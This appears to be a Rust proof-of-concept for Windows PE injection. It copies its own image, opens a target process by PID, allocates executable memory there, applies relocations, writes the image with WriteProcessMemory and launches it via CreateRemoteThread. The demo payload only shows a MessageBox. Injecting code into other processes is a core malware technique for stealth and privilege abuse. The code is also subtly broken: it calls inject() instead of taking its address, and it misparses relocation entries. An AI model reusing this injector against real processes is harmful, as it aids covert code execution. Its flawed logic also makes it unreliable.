use std::{ffi::c_void, mem::size_of, ptr::null_mut};
use windows_sys::Win32::System::{
    Diagnostics::Debug::{IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_NT_HEADERS64, WriteProcessMemory},
    LibraryLoader::{GetModuleFileNameA, GetModuleHandleA},
    Memory::{MEM_COMMIT, PAGE_READWRITE, VirtualAlloc, VirtualAllocEx},
    SystemServices::{IMAGE_BASE_RELOCATION, IMAGE_DOS_HEADER, MAXIMUM_ALLOWED},
    Threading::*,
};
use windows_sys::Win32::{
    Foundation::GetLastError, Security::SECURITY_ATTRIBUTES, UI::WindowsAndMessaging::MessageBoxA,
};

#[repr(C)]
struct BaseRelocationEntry {
    offset: u16,
    r#type: u16,
}

#[link(name = "kernel32")]
unsafe extern "system" {
    pub fn CreateRemoteThread(
        hProcess: windows_sys::Win32::Foundation::HANDLE,
        lpThreadAttributes: *const SECURITY_ATTRIBUTES,
        dwStackSize: usize,
        lpStartAddress: LPTHREAD_START_ROUTINE,
        lpParameter: *mut c_void,
        dwCreationFlags: u32,
        lpThreadId: *mut u32,
    ) -> windows_sys::Win32::Foundation::HANDLE;
}

// Sucess injection MessageBox confirmation
pub unsafe extern "system" fn inject() -> u32 {
    println!("[*] Inside inject()");
    let mut module = [0u8; 128];

    unsafe {
        GetModuleFileNameA(
            null_mut(),
            module.as_mut_ptr() as *mut u8,
            module.len() as u32,
        );
    }

    unsafe {
        MessageBoxA(
            null_mut(),
            module.as_ptr() as *const u8,
            "PE Injection\0".as_ptr() as *const u8,
            0,
        );
        0
    }
}

pub fn pe(pid: u32) {
    // Get Base Address of current exe
    let image_base = unsafe {
        let base = GetModuleHandleA(null_mut()) as *const c_void;
        base
    };

    // Parse DOS and NT headers
    let dos_header = image_base as *const IMAGE_DOS_HEADER;
    let nt_headers = unsafe {
        let headers =
            (image_base as usize + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
        headers
    };

    // Allocate memory
    let local_image = unsafe {
        let mem = VirtualAlloc(
            null_mut(),
            (*nt_headers).OptionalHeader.SizeOfImage as usize,
            MEM_COMMIT,
            PAGE_READWRITE,
        );
        mem
    };

    unsafe {
        std::ptr::copy_nonoverlapping(
            image_base,
            local_image,
            (*nt_headers).OptionalHeader.SizeOfImage as usize,
        )
    };

    let target_process: *mut c_void = unsafe {
        let handle = OpenProcess(MAXIMUM_ALLOWED, 0, pid);
        handle
    };

    // Allocate memory in the target
    let target_image = unsafe {
        let mem = VirtualAllocEx(
            target_process,
            null_mut(),
            (*nt_headers).OptionalHeader.SizeOfImage as usize,
            0x1000,
            0x40,
        );
        mem
    };

    if target_image.is_null() {
        eprintln!("[!] VirtualAllocEx Failed: {}", unsafe { GetLastError() });
        std::process::exit(1);
    }

    // Calculate offset between local and target
    let delta_image_base = target_image as isize - image_base as isize;

    // Get the base relocation table from PE headers
    let mut relocation_table = unsafe {
        let reloc = (local_image as usize
            + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize]
                .VirtualAddress as usize) as *mut IMAGE_BASE_RELOCATION;
        reloc
    };

    // Process each block of relocations
    unsafe {
        while (*relocation_table).SizeOfBlock > 0 {
            let relocation_entries_count = ((*relocation_table).SizeOfBlock as usize
                - size_of::<IMAGE_BASE_RELOCATION>())
                / size_of::<u16>();
            let relocation_rva =
                (relocation_table as usize + size_of::<IMAGE_BASE_RELOCATION>()) as *mut u16;

            for i in 0..relocation_entries_count {
                let entry = relocation_rva.add(i) as *const BaseRelocationEntry;
                if (*entry).offset != 0 {
                    let patched_address = (local_image as usize
                        + (*relocation_table).VirtualAddress as usize
                        + (*entry).offset as usize)
                        as *mut usize;
                    *patched_address = (*patched_address as isize + delta_image_base) as usize;
                }
            }

            relocation_table = (relocation_table as usize
                + (*relocation_table).SizeOfBlock as usize)
                as *mut IMAGE_BASE_RELOCATION;
        }
    };

    // Write the patched image to target process
    let write_process = unsafe {
        let written = WriteProcessMemory(
            target_process,
            target_image,
            local_image,
            (*nt_headers).OptionalHeader.SizeOfImage as usize,
            null_mut(),
        );
        written
    };

    if write_process == 0 {
        eprintln!("[!] WriteProcessMemory Failed: {}", unsafe {
            GetLastError()
        });
    }

    // Create and execute thread for injecting PE entry point
    unsafe {
        CreateRemoteThread(
            target_process,
            null_mut(),
            0,
            Some(std::mem::transmute(
                inject() as usize + delta_image_base as usize,
            )),
            null_mut(),
            0,
            null_mut(),
        )
    };
}
